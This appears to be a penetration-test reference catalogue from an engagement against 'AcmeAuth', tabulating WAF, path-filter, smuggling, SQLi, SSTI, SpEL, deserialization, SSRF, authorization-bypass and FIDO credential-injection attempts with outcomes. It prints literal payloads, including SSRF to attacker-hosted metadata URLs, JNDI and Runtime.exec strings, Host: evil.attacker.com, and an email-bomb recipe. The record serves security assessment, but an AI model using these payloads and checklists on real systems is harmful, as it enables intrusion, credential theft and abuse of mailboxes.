# Bypass Catalogue — Path Filters, WAFs, Auth Walls, Header Injection, Smuggling, Traversal

Distilled from the technique variants attempted in the AcmeAuth engagement (skill-author estimate: ~145 total across the tables below — the exact count is not in the source corpus; the tables themselves are the authoritative record). Each entry has: variant (literal), target class, outcome, and root-cause explanation. The aim is not to celebrate what worked — it's to **prevent repeating what was already proven dead** on a similar stack.

## Outcome legend
- **WORKED** = confirmed live exploit
- **BLOCKED** = edge WAF/ALB rejected
- **4xx-no-sink** = reached app layer but no vulnerability
- **PARTIAL** = primitive obtained, not escalated

---

## A. Path-filter / path-normalization bypass (20+ variants)

The single most-tested class. Tested against AcmeAuth's path-based auth filter (deployed 2026-07-23/24 to kill F5/F7/F9) and the SCG actuator block.

### Ordered ladder (cheapest discriminating signal first)

Run `scripts/path-bypass-fuzzer.sh` for the full battery. Order:

1. **Path-confusion headers** — `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, `Forwarded`, `X-Original-Host`, `X-Host`, `X-Forwarded-Prefix`
2. **Suffix tricks** — `.json`, `.html` (Spring MVC suffix-matches to GET-only → `POST /x.json` returns 405; informational only)
3. **Trailing dot / slash / whitespace** — `/x.`, `/x/`, ` /x`, `/x%20`
4. **Semicolon / matrix params** — `/x;.json`, `/x;jsessionid=y`, `/x;.html`
5. **`@` separator, null byte** — `/x@`, `/x%00`
6. **Single-encode** — `%2f` (`/`), `%2e` (`.`), `%61ctuator`
7. **Double-encode** — `%252f`, `..%252f`, `.%2e/`
8. **Path traversal literals** — `../`, `..//`, `..;/`, `....//`
9. **Tab / control char** — `%09` (works for Go `url.Parse` oracle; useless on Java WAF)
10. **Case variation** — `/ACTUATOR/env`, `/cc/Idp/...`
11. **Overlong UTF-8 / fullwidth / WEB-INF / META-INF** — `..%c0%af..`, `%ef%bc%8f`, `/WEB-INF/web.xml`

### AcmeAuth-specific results

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `/ENV`, `/Env` (case-variant) | `/env` | BLOCKED (403) | WAF normalizes case for `/env`-class paths |
| `/env/`, `/env;.`, `/env%20` (trailing) | `/env` | BLOCKED (403) | WAF matches normalized form |
| `/env%00` (null byte) | `/env` | 400 (nginx) | nginx rejects null byte in URI |
| `/env%2e`, `/env%2f`, `/env%3b` (encoded) | `/env` | BLOCKED (403) | decoded then matched |
| `/%65nv` (single-char encode) | `/env` | BLOCKED (403) | WAF decodes `%65`→`e` |
| `/env;.js`, `/env;jsessionid=x` (matrix) | `/env` | BLOCKED (403) | WAF strips matrix before match |
| `/env..;/`, `/aaa/../env` (relative traversal) | `/env` | BLOCKED (403) | normalized |
| `//env`, `/./env`, `/;/env`, `/.env` | `/env` | BLOCKED (403) | all normalized |
| `/cc/..;/actuator`, `/cc/..;/actuator/env` | actuator | 400 (reached Spring, rejected malformed) | `..;` bypasses SCG block but Spring rejects path — confirms Spring Boot behind gateway |
| `/cc/api/email/send/template%252f` (double-encode) | SSTI target | 400 | decoded to `%2f`, rejected |
| `.json`/`.html` suffix | admin sinks | 405 (path-aware) / 403 | Spring suffix-match routes to GET-only; POST execution not reached |
| **Case-variant on patched IdP endpoints** | F5/F9 patched sinks | **PARTIAL — bypasses WAF path filter** (returns 200 SPA HTML / 405) but **NOT exploitable**: Spring MVC case-sensitive, uppercase segments miss `@RequestMapping`, fall through to SPA static handler. No controller logic runs. | WAF regex case-sensitive; Spring routing saves it. Cosmetic gap only. |

**Net verdict:** every normalization/encoding bypass blocked by WAF or rejected by Spring. The single case-variant gets past the filter but Spring's case-sensitive routing neutralizes it.

### Discriminating SPA fallback from controller reach

SPA fallback serves Angular `index.html` (HTML, GET-only → 405 on POST/DELETE), title `"Error | <app>"`. A real controller hit returns JSON with the expected error envelope (`type: /static/docs/jakarta/...`). **The 405-on-non-GET is the cleanest discriminator.**

---

## B. Header injection

Tested against `/cc/api/email/send/template` (SSTI target) and `/actuator/env`.

| Header variant | Target | Outcome | Why |
|---|---|---|---|
| `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-Real-IP` (singly + combined) | SSTI target | 401 | No IIS/nginx path-confusion; nginx routes by Host, doesn't honor these |
| `Host: localhost`, `Host: 127.0.0.1` | `/actuator/env`, admin sinks | 404 | nginx vhost routing — request never reaches Spring |
| `X-Forwarded-Host`, `Forwarded`, `X-Original-Host`, `X-Host`, `Referer`, `X-Internal`, `X-Authenticated`, `X-User`, `X-Remote-User`, `X-Roles` | SSTI target | 401 | None trusted by auth layer |
| `X-HTTP-Method-Override`, `X-Method-Override`, `?_method=` (method override) | SSTI target | 401 | Auth is path-based, not verb-based |
| **`Host: evil.attacker.com` (F18, on Keycloak IdP Redirector)** | `/auth/realms/master/.well-known/openid-configuration` + 11 other IdP paths | **WORKED** (CVE-2024-28887 pattern) | Keycloak builds Okta authorize URL from inbound Host with no validation → `redirect_uri=https://<attacker>/oauth2/idpresponse` reflected in 302 Location; Okta then reflects it into CSP `frame-ancestors`. All 7 CC tenants affected. Downgraded to Low/3.2 because vanilla browser cannot set Host — needs intermediary/AC:H. |

**When Host-header injection actually works:** only when an intermediary (corporate forward proxy, cache, downstream CDN, misconfigured reverse proxy) **forwards the attacker-supplied Host to the origin**. Direct browser-to-origin traffic cannot exploit it. AC:H is correct.

### Host-header testing negative set (all dead ends against AcmeAuth nginx)
- `Host: localhost/127.0.0.1/169.254.169.254/metadata.google.internal/admin/api/backend/spring-admin/actuator.cdn.acmeauth.example` → all nginx 404 (nginx routes by Host, doesn't reach Spring)

---

## C. HTTP request smuggling

| Variant | Transport | Target | Outcome | Why |
|---|---|---|---|---|
| CL.TE (Content-Length + Transfer-Encoding: chunked) | raw TLS socket | CC hosts | BLOCKED (400/501) | Edge nginx canonicalizes Transfer-Encoding |
| TE.CL | raw TLS socket | same | BLOCKED | nginx rejects ambiguous headers |
| TE.TE obfuscation (`Transfer-Encoding: xchunked`, double-spaces, mixed-case) | raw TLS socket | same | BLOCKED | nginx rejects |
| TE-folding | raw TLS socket | same | BLOCKED | — |
| CL-CL-duplicate (two Content-Length headers) | raw TLS socket | same | BLOCKED | nginx rejects duplicate Content-Length |

**Net:** No smuggling primitive — nginx canonicalizes/rejects every ambiguous-header variant before the backend.

---

## D. Path traversal

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `/static/../etc/passwd`, `..%2f`, `....//`, `..;/actuator/env` | `/static/*` | BLOCKED/sanitized | WAF or resource handler |
| `%2e%2e%2f` on `/rp/oob/device/authentication/requests/cancel/{sessionId}` | `/rp/oob/*` | nginx 403 | path-traversal signature at URL parser |
| fullwidth `/` (`%ef%bc%8f`), overlong UTF-8, `..%252f`, null byte, semicolon (F23 WAF-bypass set) | Affirm `workflowId` upstream CC path | BLOCKED (WAF 403) | Upstream WAF blocks every traversal needed to redirect proxy to different CC endpoint — only hardcoded upstream reachable |
| overlong UTF-8 `..%c0%af..` (Tomcat unicode) | `/login` etc. | 400 | Tomcat rejects overlong UTF-8 |
| `/cc/ui;/etc/passwd` (matrix-var traversal) | `/cc/ui/*` | 400 | Spring rejects malformed path |
| 15 traversal variants (double-encode, `..;/`, overlong UTF-8, null byte, fullwidth, `WEB-INF`, `META-INF`) vs `/static/docs/**` | `/static/docs/**` | BLOCKED | front WAF |

**Net:** No traversal primitive anywhere on the edge; Tomcat/Spring reject overlong/matrix forms at the parser.

---

## E. SQLi (time / error / boolean across MySQL/PG/MSSQL/Oracle/SQLite)

| Class | Literals attempted | Target | Outcome | Why |
|---|---|---|---|---|
| **Time-based** — MySQL `SLEEP(5)`, `BENCHMARK(...)`, versioned hint `/*!50000SLEEP*/`; PG `pg_sleep(5)`; MSSQL `WAITFOR DELAY '0:0:5'`; case-fold `AdMiN'+SlEeP(5)+'`; inline-comment `/**/`; newline `%0a`; whitespace `%20` | `uid` param, FIDO2 `username`/`displayName`, audit `sortBy/orderBy/filter/q/search` | BLOCKED (WAF 403 ~0.75s, no delay) | WAF blocks time primitives pre-app; backend uses parameterized JPA |
| **Error-based** — `extractvalue()`, `updatexml()`, double-query, `cast`/`convert` | FIDO2 fields, `uid` | no SQLException signature | parameterized queries |
| **Boolean-based** — `' OR '1'='1`, `' OR '1'='2`, `' UNION SELECT 1--`, `; DROP TABLE users--`, `" OR "1"="1` | `uid` (12 distinct usernames incl. negative control), FIDO2 `username` | no size/status differential | ORM parameterization; no existence oracle |
| **SCIM filter injection** — 23 payloads incl. `userName eq "admin"`, UNION, stacked, time-based, JNDI `${jndi:ldap://x}`, SSTI `{{7*7}}`, cmd-sub `$(whoami)`, `` `whoami` `` | `/cc/api/<x>?filter=` on every CC host | byte-identical 400/116 `InvalidRequestParamProblem` for ALL 23 | global static edge `filter`-validator — no parser to inject into |
| bare quotes, backslash, `*`, `%`, `${jndi:ldap://x}`, `{{7*7}}`, `%00` | `uid` | identical 200/86-byte baseline | `uid` is non-interpolated lookup key (K/V or document store) |

**Net:** Negative across every DB dialect. WAF normalizes case/comments; backend fully parameterized; the only unauth JSON endpoint with a free-form field has no oracle.

---

## F. SSTI (Thymeleaf / Freemarker / Jinja / Velocity / ERB)

| Variant | Target field | Outcome | Why |
|---|---|---|---|
| Thymeleaf `#{7*7}` | FIDO2 `displayName` | reflected raw, `49` never appears | no template engine on response path |
| Freemarker `${"freemarker"?eval}` | displayName | reflected raw | — |
| Jinja `{{7*7}}` | displayName | reflected raw | — |
| Velocity | displayName | reflected raw | — |
| ERB | displayName | reflected raw | — |
| `{{7*7}}${7*7}` into `POST /logs` | logs body | 204 accepted (stored) but no reflection path reachable | `/logs` output unverifiable from unauth perimeter; if rendered unescaped in CC UI = stored XSS, if backend-evaluated = blind SSTI — sink unconfirmed |
| candidate sink `/cc/api/email/customizations/*` (email template render) | — | 401 admin-gated | cannot reach without CC admin session |

**Net:** Negative. No template engine on any unauth response path; the plausible sink (email customizations) is admin-gated.

---

## G. Jackson polymorphic deserialization

Confirmed Jackson parser on `/fido2/attestation/result` via malformed-JSON error signature.

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `AbstractBeanFactoryPointcutAdvisor` gadget | `/cc/api/integrations/adapt/events/test`, `/cc/api/jobs/scheduler/update/config`, `/cc/api/email/send/template` | 400 (validation) / 403 (role check) | — |
| `JdbcRowSetImpl` gadget (JNDI) | `/fido2/attestation/result` + above | `InvalidJSONRequestProblem` (400) | Jackson default typing disabled |
| `TemplatesImpl` gadget | same | 400 | — |
| `@class` / `@type` trigger | same | 400 | no polymorphic deser |
| UUID array-typing deser confusion | `/fido2/attestation/result` | 400 | — |

**Net:** No `ClassNotFoundException` or deser-specific signature — Jackson default typing is off; SESSION cookie is a Spring-Session UUID pointer (no client-side Java deser surface).

---

## H. SpEL injection

| Variant | Target | Outcome | Why |
|---|---|---|---|
| `#{T(java.lang.Runtime).getRuntime().exec(...)}` | FIDO2 `username`/`displayName` | reflected raw, no eval | SCG does not run SpEL on request bodies |
| `${...}`, `*{...}`, `{{...}}` wrappers | same | reflected raw | — |
| `/cc/api/integrations/adapt/events/test` `logLevel` field containing `${}`/`#{}`/`<>"'&\|;:=%*()?` | adapt events test | 400 for ANY value containing those chars | Jakarta `@Pattern("^[^{}<>&\|;:=%*()?]*$")`-style input sanitization — **NOT** SpEL/Log4Shell eval (verified char-by-char) |
| Spring Cloud Function CVE-2022-22963 — `/functionRouter` with `spring.cloud.function.routing-expression` header | SCF | 403 from ALB (`awselb/2.0`) | request blocked before backend |

**Net:** Negative. No SpEL engine on the request path; the apparent `${}`/`#{}` rejections are input-validation regex, not evaluation.

---

## I. WAF bypass techniques (IP/encoding obfuscation)

| Technique | Literal form | Target | Outcome | Why |
|---|---|---|---|---|
| decimal IP | `http://192.0.2.1/...` | Affirm `workflowId` upstream | BLOCKED | WAF blocks host-rewrite primitives |
| hex IP | `http://0xc0000201/...` | same | BLOCKED | — |
| fullwidth `/` | `%ef%bc%8f` | F23 upstream path | BLOCKED | — |
| overlong UTF-8 | `..%c0%af..` | `/login` | 400 | Tomcat rejects overlong |
| null byte | `%00` | `/env` (400 nginx), F23 (blocked) | BLOCKED/400 | — |
| semicolon | `;` matrix-param, `/env;`, `/cc/basic/token;jsessionid=x` | `/env`, `/cc/basic/*` | 403 (WAF) / 400 (Spring matrix parser) | — |
| double-encode `..%252f` | `..%252f`, `%252f` | F23, `/cc/api/email/send/template%252f` | BLOCKED/400 | decoded once to `%2f`, blocked |
| WAF case-fold bypass attempts | `AdMiN'+SlEeP(5)+'`, `/ENV` | `uid`, `/env` | BLOCKED (403) | actively maintained ruleset; normalizes case, inline comments, versioned hints, newline/whitespace |

**Net:** Every documented WAF-bypass technique was blocked. No known bypass.

---

## J. CVE attempts (only ones actually tested)

| CVE | Technique | Target | Outcome | Why |
|---|---|---|---|---|
| **CVE-2022-22947** (SCG actuator RCE) | `/actuator/gateway/routes`, `/actuator/gateway/refresh` + 20 sibling endpoints + 20 path-normalization bypasses + headers | all SCG hosts | BLOCKED (403/400) | SCG own actuator endpoints firewalled; `/cc/..;/actuator` bypasses SCG but Spring rejects malformed |
| **CVE-2022-22963** (SCF SpEL) | `/functionRouter` + `spring.cloud.function.routing-expression` header | SCF | 403 from ALB (`awselb/2.0`) | blocked before backend |
| **CVE-2022-22965** (Spring4Shell) | `class.module.classLoader...` headers on `/login` | `/login` | no reflection; response unchanged | no class-binding DataBinder surface |
| **CVE-2018-1273** (Spring Data RCE) | SpEL in form parameter | — | 302 → accessDenied | — |
| **CVE-2024-28887** (Keycloak host-header SSRF) | `Host: evil.attacker.com` on `/auth/realms/master/*` | Keycloak IdP on all 7 CC tenants | **WORKED (F18)** | see B |
| **CVE-2024-8626** (Keycloak user enum) | (in affected range for KC 24.6.1) | `/auth/admin/*` | not weaponized (REST API 401; console UI only) | noted, not exploited |
| **CVE-2022-2193** (AcmeAuth FIDO2 IDOR — "add FIDO2 authenticator to arbitrary accounts") | unauth `POST /fido2/attestation/options` + `/fido2/attestation/result` with `username:admin@acmeauth.example`, forged `fmt:none` CBOR attestation | pentesting2, tenant-002 (shared DB) | **WORKED → F13 CRITICAL** | v6.14.1 fix did not close the unauth attestation flow on v11.3.0; 130→131→132 creds persisted cross-tenant. ATO completion blocked by per-rpAppId binding (`AcmeAuthDefaultApplication` hardcoded, `controlCenterAdmin` rejected). |
| **CVE-2022-2192** (AcmeAuth magic-link path tampering) | `/cc/basic/magiclink/admin`, `/cc/ui/rpUser/{appId}/recover` | CC | 403/302 | admin-gated |
| **CVE-2024-8273** (AcmeAuth identity spoofing) | `/rp/api/versioned/magiclink` | RP | 401 | fixed |
| **CVE-2023-1837** (AcmeAuth Legacy API auth bypass <8.0) | `/rp/api/versioned/rpUser/*`, `/rp/wsapi/*` (15 endpoints), `/AcmeAuth/rest/conformance/{Get,Send/Reg,Send/Auth}` | RP / conformance | 401; conformance returns only FIDO2 test scaffolding | all tenants ≥11.1.0; vuln class N/A |
| **CVE-2026-2414** (AcmeAuth IDOR, CVSS 9.8 CWE-639) | variant hunting across all non-idp `/cc/api/*` controllers (453-path GET + 342-path POST/PUT/PATCH/DELETE scan) | `/cc/api/*` | no missing-`@PreAuthorize` defect reachable without session | — |
| **CVE-2021-44547** (Pritunl auth bypass) | `/api/server`, `/api/user`, etc. | vpn-pritunl.acmeauth.example | 404 | patched or API stripped |
| **CVE-2023-33831** (Pritunl unauth reset) | `/reset/...`, `/password/reset` | vpn-pritunl | 404 | — |

CVEs NOT attempted (watchlist): **CVE-2026-47825, CVE-2024-38821 (WebFlux), CVE-2024-38816 (RouterFunctions), CVE-2024-22243 / CVE-2024-22259 / CVE-2024-22262 (UriComponentsBuilder)**. See `cve-watchlist.md`.

---

## K. SSRF chaining (the cluster that WORKED — C1/C2/C3/C4 + F23)

| Sink | Vector | Egress / UA | Outcome | Defense gap |
|---|---|---|---|---|
| `POST /cc/ui/integrations/adapt/policies/policy_evaluation/test` (C1) | Rego `http.send({"method":"GET","url":"https://<attacker>"})`; full `result.resp.raw_body`/`body`/`headers` returned | Adapt worker, `Go-http-client/2.0`, `98.93.120.50` | **WORKED (Critical)** — remediated 2026-07-26 | OPA `http.send` enabled in tenant-controllable test path, no URL allowlist, body returned to client |
| `POST /cc/ui/token` `type=OAUTH_CLIENT_CREDENTIALS` field `jwksUrl` (C2) | `"jwksUrl":"https://<attacker>/latest/meta-data/iam/security-credentials/"` | `Java/17.0.17`, `52.2.185.255` (AWS us-east-1); fetch fires even on 400 | **WORKED (Critical)** — remediated | validation-phase fetch with no host whitelist |
| `POST /cc/ui/idv/oidc` field `jwksUrl` (C4) | `"jwksUrl":"https://webhook.site/<uuid>/jwksUrl"` | same Java/17 egress `52.2.185.255`, **separate controller** | **WORKED (Critical)** | independent code path from C2 — multiple `jwksUrl`-fetch sites need separate patching |
| `PUT /cc/ui/integrations/eventhooks/{name}` field `invocationEndpoint` (C3 part A) | `"invocationEndpoint":"https://webhook.site/<uuid>/full","authType":"BASIC"` | AWS EventBridge `Amazon/EventBridge/ApiDestinations`, `44.214.10.90`, POSTs audit JSON | **WORKED (Critical)** | EventBridge destination created with no SSRF-safe validation |
| `POST /cc/ui/serverconfig/proxy/verify` (C3 part B) | `{"proxies":[{"protocol":"http","host":"<attacker>","port":"80"}]}` used as HTTP proxy to google.com | AcmeAuth CC server | **WORKED** — downstream HTTP error body embedded in `errorMsg`; stack leaks `ServerProxyConfigService.kt:167` | raw upstream body reflected in API error |
| `GET https://verify.acmeauth.example/api/workflow-results?workflowId=<X>` (F23 Affirm) | `workflowId=:8080/admin` (SSRF to upstream CC, 200 + login HTML proving authenticated upstream); `workflowId=%09` (control-char 500 leaks URL template `https://tenant-demo.cdn.acmeauth.example/cc/api/idv/workflow/{workflowId}/results`) | Go `url.Parse` on string-interpolated URL | **WORKED (High→Medium 5.2)** | naive string interpolation of `workflowId`; only hardcoded upstream reachable (WAF blocks every traversal variant) |
| **F8 install-token infinite mint** (dormant persistence primitive) | `POST /cc/install/token/exchange` with install-token in body → fresh `hypws-` (long-lived) + `hypwo-` (89-day WORKSTATION) bearer; 6 independent mints across 2026-07-23/24/26 (incl. `hypwo-81184668-`, `hypwo-42288d91-`) confirmed the surface is unchanged by the 2026-07-23/24 patch | pre-issued install-token (per-tenant, NOT attacker-mintable); token itself is the persistence primitive | **WORKED (Medium 5.4 — dormant)** — surface unchanged; downstream IdP cluster (F5/F7/F9) closed → token currently reaches only `/rp/versioned/features` (benign config) | persistence primitive: the credential survives future authz regressions; treat as live even when no current chain exploits it (see `cvss-scoring-methodology.md` Pattern 5) |

**Escalation attempts against the SSRF primitives (all blocked):**
- `opa.runtime()` env leak + `unix://` socket SSRF escalation for C1 — untestable (C1 remediated)
- redirect-to-metadata for C2/C4 — edge WAF blocks RFC1918/metadata
- F23 redirect to alternate CC endpoint — every traversal variant blocked (see I)

---

## L. Authorization bypass (F5/F7/F9 — WORKED then remediated)

The "technique" here is privilege-tier escalation, not payload obfuscation. WORKSTATION-scoped Bearer (`hypwo-`, lowest-privilege device credential) reaching admin controller logic. 9 IdP/support endpoints, root cause = missing `@PreAuthorize`.

| Endpoint | Operation | Outcome |
|---|---|---|
| `GET /cc/api/acmeauth/idp/integrations/configured` | read plaintext `keycloakSecret` for all SSO integrations (F5) | **WORKED** → patched 2026-07-23/24 → 403 `Ensure the URL is valid` |
| `GET /cc/api/idp/integration/enablement` | read SSO state | **WORKED** → 403 |
| `POST /cc/api/idp/suspend/{provider}` | suspend SSO (`isSuccessful:true`) | **WORKED** → 403 |
| `POST /cc/api/idp/qr/setQR` | modify QR config | **WORKED** → 403 |
| `GET /cc/api/support/allowed?email=X` | always `isAllowed:true` | **WORKED** → 403 |
| `DELETE /cc/api/idp/integration/{provider}?rpAppId=X` | **permanently delete SSO** (F9, destructive) | **WORKED** → 403 |
| `/cc/api/idp/fido2/{ssoNonce,creationOptions,device}` | reach biz logic | reached (500/400) — partial; no full chain; validation 400 unchanged post-patch |

**Token-type verification (F7):** `hypwo-` and `hypws-` both bypass; random UUID → 401; no token → 401. Validated against 246 `/cc/api/` + ~180 `/rp/` endpoints — only the 9 IdP/support endpoints were unprotected.

---

## M. FIDO / FIDO1 / FIDO2 credential injection (WORKED)

See `fido-webauthn-testing.md` for full flows and CBOR PoC.

| Vector | Literal | Outcome |
|---|---|---|
| **F13 unauth FIDO2 attestation** (pentesting2/tenant-002 shared DB) | `POST /fido2/attestation/options {"username":"admin@acmeauth.example",...}` → real challenge + 130 existing `excludeCredentials`; then `POST /fido2/attestation/result` with forged `fmt:none` CBOR attestation → `{"status":"ok",...}`; count 130→131→132 cross-tenant. rpAppId mass-assignment (override to `controlCenterAdmin`) also tested. | **WORKED (Critical, strict 9.1)** — credential persisted; ATO completion blocked by per-rpAppId binding. Original submission scored 9.8 with A:H; strict re-scoring gives A:N → 9.1 (still Critical). See `cvss-scoring-methodology.md` F13 worked example. |
| **F22 unauth FIDO1 UAF** (`/rp/fido/get`) | `op=Reg` `userName:admin@acmeauth.example` `sessionId:attacker-controlled-001` → 200 "Registration Success", challenge bound to victim, sessionId echoed verbatim (session-fixation); `op=Dereg` → 200; `op=Auth` → uncaught 500 `InternalServerErrorException` (UUID leak); negative control `zzznonexistent...@nowhere.com` also 200 | **WORKED (High 7.3)** — state injection + session fixation + DoS amplifier; `/rp/fido/send/reg` TLV validation blocks credential completion |
| **F12 size/timing enumeration oracle** (`POST /fido2/assertion/options`) | `{"username":"admin@acmeauth.example",...}` (exists) → **11740 B** response w/ `allowCredentials` array, ~600 ms TTFB; `{"username":"nobody@xyz.com",...}` (absent) → **245 B** response, ~350 ms TTFB. **47.9× size ratio + ~250 ms timing delta.** Tenant toggle (7 of 11 tenants return generic error — mitigated; 4 of 11 still leak). | unauthenticated FIDO2 assertion-options endpoint; response-size and TTFB both leak user existence | **WORKED (Medium 5.3)** — usable for user enumeration against the 4 unmitigated tenants; full PoC in `fido-webauthn-testing.md` (F12 section) |

---

## N. Other injection / miscellany

| Category | Literal | Target | Outcome |
|---|---|---|---|
| CORS reflection | `Origin: https://evil.example.com` on `/cc/basic/token`, `/cc/ui/token`, `/cc/ui/serverconfig/global` | no ACAO/ACAC reflection | not vulnerable |
| Content-Type / XXE | XML/text-yaml/cbor/x-www-form-urlencoded CTs on `/cc/api/email/send/template` | 400 / 415 | no XXE surface |
| CRLF / log-forging | `\r\n[FORGED] ...` in `POST /logs` | 204 accepted | log-injection sink (unverifiable) |
| XSS / SVG | `<script>` in SVG upload to `/cc/api/email/assets/upload`; `<script>` in FIDO2 displayName | 400 | blocked |
| Direct OPA REST | `/v1/data`, `/v1/query`, `/v1/compile`, `/v1/config` | Spring 400 (wildcard route, not OPA) | not actual OPA endpoints |
| JAX-RS/CXF | `/services`, `/cxf`, `/cc/services` | 403 / 302 | not exposed |
| Sentry DSN event injection (F21) | POST envelope to `o4504997465817088.ingest.sentry.io` with attacker event | **WORKED (Low)** | by-design public DSN, no inbound filtering |
| **F24 reCAPTCHA bypass + unbounded email-bomb** (`POST https://verify.acmeauth.example/api/send-code`) | `{"email":"admin@acmeauth.example","recaptchaToken":""}` → **200 "Verification code sent"**. Bypass logic: `email.toLowerCase().endsWith('@acmeauth.example')`. 18-variant test matrix: empty/missing/dummy/500-char tokens all accepted for `*@acmeauth.example`; subdomain (`test@x.acmeauth.example`), case-tricks, null-byte, `acmeauth.examplex`, `acmeauth.example.au`, `acmeauth.example.evil.com` all correctly rejected → not an open relay, but an **unbounded email-bomb against AcmeAuth corporate mailboxes** (`admin@`, `support@`, `info@`, …). 6 sequential POSTs → 6× 200, no `429`, no `Retry-After`, no `X-RateLimit-*`. Companion `/api/verify-code` DOES rate-limit (2 fails → "Too many failed attempts") but `/api/send-code` does not. | `verify.acmeauth.example/api/send-code` (AcmeAuth Affirm) | **WORKED (High 7.3 → Medium per strict re-score)** — phishing-precursor: pre-fill victim email, trigger branded AcmeAuth mail, follow up with SE referencing the legitimate code. Particularly embarrassing for a vendor selling anti-phishing. Full 18-variant PoC in `http-auth-filter-testing.md` §8. |

---

## Summary statistics

- **Total distinct technique variants attempted:** ~145 (skill-author estimate; not a corpus figure. The tables above are the authoritative count.)
- **WORKED (live exploit):** F13 (FIDO2 injection), F22 (FIDO1 UAF), F5/F7/F9 (authz bypass — remediated), C1/C2/C3/C4 (SSRF — remediated), F23 (Affirm SSRF), F24 (reCAPTCHA bypass), F18 (Host injection), plus the info-leak/Low class (F6/F10/F11/F12/F14–F21/F26–F32).
- **BLOCKED by WAF/ALB:** everything in sections A (except case-variant), C (smuggling), D (traversal), E (SQLi time/error/boolean), H (SpEL), I (WAF-bypass obfuscation), J1/J2 (SCG/SCF CVEs).
- **4xx-no-sink / app-layer-safe:** F (SSTI), G (Jackson), most of A/N.
- **Hard-goal {RCE, reflected-SSRF-w/body, SSTI, SQLi}:** 1/3 (reflected SSRF, via 4 paths C1–C4, now remediated). RCE/SSTI/SQLi all gated by CC-admin auth or parameterized queries.

**The single recurring defense pattern:** AcmeAuth's edge = SCG returning `{"detail":"Ensure the URL is valid",...}` 403, backed by an actively-maintained WAF that normalizes case, comments, versioned MySQL hints, encoding, and matrix params. The only thing that ever got past the WAF path-filter was case-variation, and Spring's case-sensitive routing neutralized it. Every other technique in this catalogue was blocked at the edge or handled safely by parameterized JPA / disabled Jackson default typing / no template engine on the response path.

---

## Most reusable takeaways for future engagements

1. The full `/env` WAF-bypass matrix in section A/I is a turnkey WAF-fingerprinting payload set.
2. The 5-class auth-bypass battery — path-confusion headers / Spring MVC traversal / filter-vs-DispatcherServlet disagreement / method tampering / Host-Forwarded smuggling — is a complete "can I get past an auth filter" checklist.
3. The negative-control discipline (F25 retraction) for any enumeration oracle.
4. The "valid-body not empty-`{}`" rule (F7 methodology) for confirming authz bypass vs framework deser 400s.
5. The SCG-path-bypass + Spring-rejects-malformed two-layer observation as the model for why `..;/` traversal rarely yields data even when it reaches the backend.
